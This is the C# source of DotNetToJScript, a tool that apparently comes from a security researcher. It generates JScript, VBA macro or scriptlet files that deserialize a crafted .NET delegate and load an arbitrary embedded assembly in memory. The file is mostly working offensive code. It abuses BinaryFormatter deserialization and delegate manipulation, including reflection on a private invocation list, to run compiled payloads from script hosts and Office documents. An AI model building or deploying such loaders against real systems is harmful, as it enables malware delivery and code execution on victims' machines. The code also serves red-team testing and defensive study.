//    This file is part of DotNetToJScript - A tool to generate a 
//    JScript which bootstraps an arbitrary v2.NET Assembly and class.
//    Copyright (C) James Forshaw 2017
//
//    DotNetToJScript is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    DotNetToJScript is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.

using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Xml;
using System.Xml.Schema;

namespace Serialize
{
    class Program
    {
        static string jscript_template =
            @"
var serialized_obj = [
%SERIALIZED%
];
var entry_class = '%CLASS%';

try {
    var stm = new ActiveXObject('System.IO.MemoryStream');
    var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
    var al = new ActiveXObject('System.Collections.ArrayList')

    for (i in serialized_obj) {
        stm.WriteByte(serialized_obj[i]);
    }

    stm.Position = 0;
    var n = fmt.SurrogateSelector;
    var d = fmt.Deserialize_2(stm);
    al.Add(n);
    var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
    %ADDEDSCRIPT%
} catch (e) {
    WScript.Echo(e.message);
}";

        static string vba_template =
            @"
Private Function decodeHex(hex)
    On Error Resume Next
    Dim DM, EL
    Set DM = CreateObject(""Microsoft.XMLDOM"")
    Set EL = DM.createElement(""tmp"")
    EL.DataType = ""bin.hex""
    EL.Text = hex
    decodeHex = EL.NodeTypedValue
End Function

Function Run()
    Dim serialized_obj
    %SERIALIZED%

    entry_class = ""%CLASS%""

    Dim stm As Object, fmt As Object, al As Object
    Set stm = CreateObject(""System.IO.MemoryStream"")
    Set fmt = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
    Set al = CreateObject(""System.Collections.ArrayList"")

    Dim dec
    dec = decodeHex(serialized_obj)

    For Each i In dec
        stm.WriteByte i
    Next i

    stm.Position = 0

    Dim n As Object, d As Object, o As Object
    Set n = fmt.SurrogateSelector
    Set d = fmt.Deserialize_2(stm)
    al.Add n

    Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
    %ADDEDSCRIPT%
End Function
";

        static string scriptlet_template =
            @"<?xml version='1.0'?>
<package>
<component id='dummy'>
<registration
  description='dummy'
  progid='dummy'
  version='1.00'
  remotable='True'>
</registration>
</component>
</package>
";

        static object BuildLoaderDelegate(byte[] assembly)
        {
            // Create a bound delegate which will load our assembly from a byte array.
            Delegate res = Delegate.CreateDelegate(typeof(XmlValueGetter),
                assembly,
                typeof(Assembly).GetMethod("Load", new Type[] { typeof(byte[]) }));

            // Create a COM invokable delegate to call the loader. Abuses contra-variance
            // to make an array of headers to an array of objects (which we'll just pass
            // null to anyway).
            return new HeaderHandler(res.DynamicInvoke);
        }

        static object BuildLoaderDelegateMscorlib(byte[] assembly)
        {
            Delegate res = Delegate.CreateDelegate(typeof(Converter<byte[], Assembly>),
                assembly,
                typeof(Assembly).GetMethod("Load", new Type[] { typeof(byte[]), typeof(byte[]) }));

            HeaderHandler d = new HeaderHandler(Convert.ToString);

            d = (HeaderHandler)Delegate.Combine(d, (Delegate)d.Clone());
            d = (HeaderHandler)Delegate.Combine(d, (Delegate)d.Clone());

            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);

            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = res;
            fi.SetValue(d, invoke_list);

            d = (HeaderHandler)Delegate.Remove(d, (Delegate)invoke_list[0]);
            d = (HeaderHandler)Delegate.Remove(d, (Delegate)invoke_list[2]);

            return d;
        }

        const string DEFAULT_ENTRY_CLASS_NAME = "TestClass";

        static string CreateScriptlet(string script, bool register_script)
        {
            XmlDocument doc = new XmlDocument();
            doc.LoadXml(scriptlet_template);
            XmlWriterSettings settings = new XmlWriterSettings();
            settings.Indent = true;
            settings.NewLineOnAttributes = true;
            settings.Encoding = new UTF8Encoding(false);

            XmlNode root_node = doc.SelectSingleNode(register_script ? "/package/component/registration" : "/package/component");
            XmlNode script_node = root_node.AppendChild(doc.CreateElement("script"));
            script_node.Attributes.Append(doc.CreateAttribute("language")).Value = "JScript";
            script_node.AppendChild(doc.CreateCDataSection(script));
            
            using (MemoryStream stm = new MemoryStream())
            {
                using (XmlWriter writer = XmlWriter.Create(stm, settings))
                {
                    doc.Save(writer);
                }
                return Encoding.UTF8.GetString(stm.ToArray());
            }
        }

        static HashSet<string> GetValidClasses(byte[] assembly)
        {
            Assembly asm = Assembly.Load(assembly);
            return new HashSet<string>(asm.GetTypes().Where(t => t.IsPublic && t.GetConstructor(new Type[0]) != null).Select(t => t.FullName));
        }

        static void WriteColor(string str, ConsoleColor color)
        {
            ConsoleColor old_color = Console.ForegroundColor;
            Console.ForegroundColor = color;
            try
            {
                Console.Error.WriteLine(str);
            }
            finally
            {
                Console.ForegroundColor = old_color;
            }
        }

        static void WriteError(string str)
        {
            WriteColor(str, ConsoleColor.Red);
        }

        static void WriteError(string format, params object[] args)
        {
            WriteError(String.Format(format, args));
        }
        
        static void Main(string[] args)
        {
            try
            {
                if (Environment.Version.Major != 2)
                {
                    WriteError("This tool only works on v2 of the CLR");
                    Environment.Exit(1);
                }

                string output_file = null;
                string entry_class_name = DEFAULT_ENTRY_CLASS_NAME;
                string script_file = null;
                bool mscorlib_only = false;
                bool scriptlet_moniker = false;
                bool scriptlet_uninstall = false;
                bool vba_code = false;

                bool show_help = false;

                OptionSet opts = new OptionSet() {
                        { "n", "Build a script which only uses mscorlib.", v => mscorlib_only = v != null },
                        { "m", "Build a scriptlet file in moniker format.", v => scriptlet_moniker = v != null },
                        { "u", "Build a scriptlet file in uninstall format.", v => scriptlet_uninstall = v != null },
                        { "v", "Build a VBA file.", v => vba_code = v != null },
                        { "o=", "Specify output file (default is stdout).", v => output_file = v },
                        { "c=", String.Format("Specify entry class name (default {0})", entry_class_name), v => entry_class_name = v },
                        { "s=", "Specify file with additional script. 'o' is created instance.", v => script_file = v },
                        { "h|help",  "Show this message and exit", v => show_help = v != null },
                };

                string assembly_path = opts.Parse(args).FirstOrDefault();
                if (!File.Exists(assembly_path) || show_help)
                {
                    Console.Error.WriteLine(@"Usage: DotNetToJScript [options] path\to\asm");
                    Console.Error.WriteLine("Copyright (C) James Forshaw 2017. Licensed under GPLv3.");
                    Console.Error.WriteLine("Options");
                    opts.WriteOptionDescriptions(Console.Error);
                    Environment.Exit(1);
                }

                byte[] assembly = File.ReadAllBytes(assembly_path);
                try
                {
                    HashSet<string> valid_classes = GetValidClasses(assembly);
                    if (!valid_classes.Contains(entry_class_name))
                    {
                        WriteError("Error: Class '{0}' not found is assembly.", entry_class_name);
                        if (valid_classes.Count == 0)
                        {
                            WriteError("Error: Assembly doesn't contain any public, default constructable classes");
                        }
                        else
                        {
                            WriteError("Use one of the follow options to specify a valid classes");
                            foreach (string name in valid_classes)
                            {
                                WriteError("-c {0}", name);
                            }
                        }
                        Environment.Exit(1);
                    }
                }
                catch (Exception)
                {
                    WriteError("Error: loading assembly information.");
                    WriteError("The generated script might not work correctly");
                }

                BinaryFormatter fmt = new BinaryFormatter();
                MemoryStream stm = new MemoryStream();
                fmt.Serialize(stm, mscorlib_only ? BuildLoaderDelegateMscorlib(assembly) : BuildLoaderDelegate(assembly));

                byte[] ba = stm.ToArray();
                string template;
                StringBuilder builder = new StringBuilder();

                if (vba_code)
                {
                    template = vba_template;

                    string hex_encoded = BitConverter.ToString(ba).Replace("-", "");

                    for (int i = 0; i < hex_encoded.Length; i++)
                    {
                        if (i == 0)
                        {
                            builder.Append("    serialized_obj = \"");
                        }
                        else if (i % 100 == 0)
                        {
                            builder.Append("\"");
                            builder.AppendLine();
                            builder.Append("    serialized_obj = serialized_obj & \"");
                        }
                        builder.Append(hex_encoded[i]);
                    }
                    builder.Append("\"");

                } else {
                    template = jscript_template;

                    for (int i = 0; i < ba.Length; ++i)
                    {
                        builder.Append(ba[i]);
                        if (i < ba.Length - 1)
                        {
                            builder.Append(",");
                        }
                        if (i > 0 && (i % 32) == 0)
                        {
                            builder.AppendLine();
                        }
                    }
                }

                string script = template.Replace("%SERIALIZED%", builder.ToString()).Replace("%CLASS%", entry_class_name).Replace("%ADDEDSCRIPT%", File.Exists(script_file) ? File.ReadAllText(script_file) : "");

                if (scriptlet_moniker || scriptlet_uninstall)
                {
                    script = CreateScriptlet(script, scriptlet_uninstall);
                }

                if (!String.IsNullOrEmpty(output_file))
                {
                    File.WriteAllText(output_file, script, new UTF8Encoding(false));
                }
                else
                {
                    Console.WriteLine(script);
                }
            }
            catch (Exception ex)
            {
                ReflectionTypeLoadException tex = ex as ReflectionTypeLoadException;
                if (tex != null)
                {
                    WriteError("Couldn't load assembly file");
                    foreach (var e in tex.LoaderExceptions)
                    {
                        WriteError(e.Message);
                    }
                }
                else
                {
                    WriteError(ex.Message);
                }
            }
        }
    }
}
